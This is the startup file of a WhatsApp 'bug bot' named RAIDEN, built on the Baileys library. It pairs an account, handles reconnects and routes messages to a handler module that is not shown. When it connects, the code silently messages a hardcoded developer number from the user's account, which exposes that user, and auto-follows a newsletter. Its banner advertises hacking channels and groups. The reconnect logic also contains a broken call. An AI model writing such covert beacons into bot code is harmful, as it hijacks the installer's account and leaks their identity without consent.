/* 𝗕𝗔𝗦𝗘 𝗕𝗬 𝗖𝗥𝗬𝗣𝗧𝗢 𝗟𝗢𝗥𝗗 𝗛𝗜𝗠𝗦𝗘𝗟𝗙*/
//========Ambassador========
require('./system/config');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore, jidDecode, proto } = require("@whiskeysockets/baileys");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const chalk = require('chalk')
const readline = require("readline")
const { smsg, fetchJson, await, sleep } = require('./system/lib/myfunction');
//======================
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})};
//======================
async function StartZenn() {
const { state, saveCreds } = await useMultiFileAuthState('./session')
const ambass = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]
});
//======================
if (usePairingCode && !ambass.authState.creds.registered) {
console.log(chalk.cyan("-[ 🔗 𝗧𝗶𝗺𝗲 𝗳𝗼𝗿 𝗣𝗮𝗶𝗿𝗶𝗻𝗴! ]"));
const phoneNumber = await question(chalk.green("-📞 𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗡𝘂𝗺𝗯𝗲𝗿 𝗯𝗲𝗹𝗼𝘄::\n"));
const code = await ambass.requestPairingCode(phoneNumber.trim(), "RAIDENNN");
console.log(chalk.blue(`-✅ 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲: `) + chalk.magenta.bold(code));
}
ambass.public = global.publik
//======================
ambass.ev.on("connection.update", async (update) => {
const { connection, lastDisconnect } = update;
if (connection === "close") {
const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
const reconnect = () => StartZenn();
const reasons = {
[DisconnectReason.badSession]: "Bad Session :Bad session, please delete the session and rescan!!",
[DisconnectReason.connectionClosed]: "Connection closed, attempting to reconnect......",
[DisconnectReason.connectionLost]: "Disconnected from server, reconnecting......",
[DisconnectReason.connectionReplaced]: "Session replaced, please close the old session first!!",
[DisconnectReason.loggedOut]: "Device logged out, please rescan!",
[DisconnectReason.restartRequired]: "Restart required, restarting..",
[DisconnectReason.timedOut]: "Connection timed out, reconnecting.."};
console.log(reasons[reason] || `Unknown DisconnectReason: ${reason}`);
(reason === DisconnectReason.badSession || reason === DisconnectReason.connectionReplaced) ? ambass() : reconnect()}
if (connection === "open") {
let cnnc = `𝗥𝗔𝗜𝗗𝗘𝗡 𝗩𝟭 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟🏆💪 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗, 𝗧𝗛𝗔𝗡𝗞 𝗬𝗢𝗨 𝗙𝗢𝗥 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗥𝗔𝗜𝗗𝗘𝗡 𝗩𝟭 𝗕𝗨𝗚 🐞👾🐛 𝗕𝗢𝗧 𝗙𝗘𝗘𝗟 𝗙𝗥𝗘𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 𝗨𝗦 𝗛𝗘𝗥𝗘😇😍🥳

𝗥𝗔𝗜𝗗𝗘𝗡 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 : https://whatsapp.com/channel/0029VaqtYx55Ejy0AP7oD124

𝗛𝗔𝗖𝗞𝗜𝗡𝗚 𝗧𝗨𝗧𝗢𝗥𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 : https://whatsapp.com/channel/0029VakGsvvKwqSTt4hEEz1q

𝗛𝗔𝗖𝗞𝗜𝗡𝗚 𝗚𝗥𝗢𝗨𝗣 : https://chat.whatsapp.com/IsNEP2yJjgwGHDovpwa5kC

𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥\n> ©𝗖𝗥𝗬𝗣𝗧𝗢 𝗟𝗢𝗥𝗗`;
            ambass.sendMessage("2347087013189@s.whatsapp.net", { text: cnnc });
            await console.clear()
            ambass.newsletterFollow("120363399869423617@newsletter");
console.log(chalk.red.bold("-[ 𝗥𝗔𝗜𝗗𝗘𝗡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱! ]"));
}});
//==========================//
ambass.ev.on("messages.upsert", async ({
messages,
type
}) => {
try {
const msg = messages[0] || messages[messages.length - 1]
if (type !== "notify") return
if (!msg?.message) return
if (msg.key && msg.key.remoteJid == "status@broadcast") return
const m = smsg(ambass, msg, store)
require(`./system/raiden`)(ambass, m, msg, store)
} catch (err) { console.log((err)); }})
//=========================//
ambass.decodeJid = (jid) => {
if (!jid) return jid;
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {};
return decode.user && decode.server && decode.user + '@' + decode.server || jid;
} else return jid;
};
//=========================//
ambass.sendText = (jid, text, quoted = '', options) => ambass.sendMessage(jid, { text: text, ...options }, { quoted });
ambass.ev.on('contacts.update', update => {
for (let contact of update) {
let id = ambass.decodeJid(contact.id);
if (store && store.contacts) {
store.contacts[id] = { id, name: contact.notify };
}
}
});
ambass.ev.on('creds.update', saveCreds);
return ambass;
}
//=============================//
console.log(chalk.green.bold(
`⠀⠀⠀⠀⠀⠀⠀⢀⡔⠝⠁⠀⠀⠀⠀⠀⠀⠀⠀⠐⠌⠂⢄⠀
⠀⠀⠀⠀⡠⢒⣾⠟⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠜⣷⠢⢴⡠⠤⠤⡀
⠀⠀⢀⣜⣴⣿⡏⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣷⡌⢃⠁⠀⠌
⠀⣰⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣮⣧⢈⠄
⡾⠑⢜⢯⡛⡿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢋⠃⠿⡙⡝⢷⡀
⢾⣞⡌⣌⢡⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⢠⢘⡘⢸⢁⣟⣨⣿
⠀⠿⣿⣾⣼⣼⡇⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⣀⣧⠀⢸⠀⢸⣿⣷⣿⣿⡿⢻⠛
⠀⠀⢈⣿⡿⡏⠀⢠⠞⣶⣶⣦⡒⠄⠈⠀⠁⣡⣴⣦⣾⠇⠀⠀⠛⣟⠛⢃⠀⠀
⠀⠀⠌⣧⢻⠀⠀⠀⠢⣳⣯⠍⠈⠀⠀⠀⠀⠁⠯⠉⢗⡄⠀⠀⡀⢸⠢⡀⢢⠀
⠀⠘⢰⠃⣸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣷⣤⡑
⠀⡠⢃⣴⠏⠀⠀⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⣿⡗⠹
⠔⢀⡎⡇⠀⠀⡄⠀⢸⣦⡀⠀⠀⠀⠶⠿⡇⠀⠀⣠⣾⠁⠀⣴⠀⠀⢰⣿⠁⠀
⣠⣿⠁⡇⢰⠀⢰⠀⠈⣿⣿⡖⠤⣀⠀⠀⣀⢤⣾⢻⡿⠀⢠⠀⢠⠀⣿⡟⠀⠀
⣾⣿⠀⢃⠈⠀⠈⡄⢰⡸⢫⡇⠀⠀⠈⠉⠀⢸⠉⠺⡇⠀⡞⡄⣈⡀⣿⢁⠀⠀
⣿⣿⠀⠸⡄⢃⠄⣘⠸⡂⠪⣄⠀⠀⠀⠀⠀⠈⡄⡰⡃⢼⡧⠁⠛⢳⠧⠅⠈⠀
      ${chalk.red.bold("[ 𝗥𝗔𝗜𝗗𝗘𝗡 - 𝗚𝗲𝘁𝘁𝗶𝗻𝗴 𝗿𝗲𝗮𝗱𝘆 ]")} 
────────────────────────────
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝗖𝗥𝗬𝗣𝗧𝗢 𝗟𝗢𝗥𝗗
𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : 𝗖𝗵𝗮𝘁 𝗚𝗽𝘁
────────────────────────────`));
StartZenn()
//======================